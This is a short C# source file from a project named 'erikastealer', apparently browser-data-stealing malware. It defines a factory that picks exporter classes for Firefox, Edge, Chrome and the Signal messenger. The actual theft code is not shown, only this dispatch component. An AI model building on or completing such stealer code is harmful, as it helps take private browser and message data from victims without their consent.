using erikastealer.Exporters;
using System;

namespace erikastealer
{


    public class BrowserDataExporter
    {
        public static IExporter GetExporter(string browser)
        {
            switch (browser.ToLower())
            {
                case "firefox":
                    return new FirefoxDataExporter();
                case "edge":
                    return new EdgeDataExporter();
                case "chrome":
                    return new ChromeDataExporter();
                case "signal":
                    return new SignalDataExporter();
                default:
                    throw new NotSupportedException($"Przeglądarka '{browser}' nie jest wspierana.");
            }
        }
    }
}
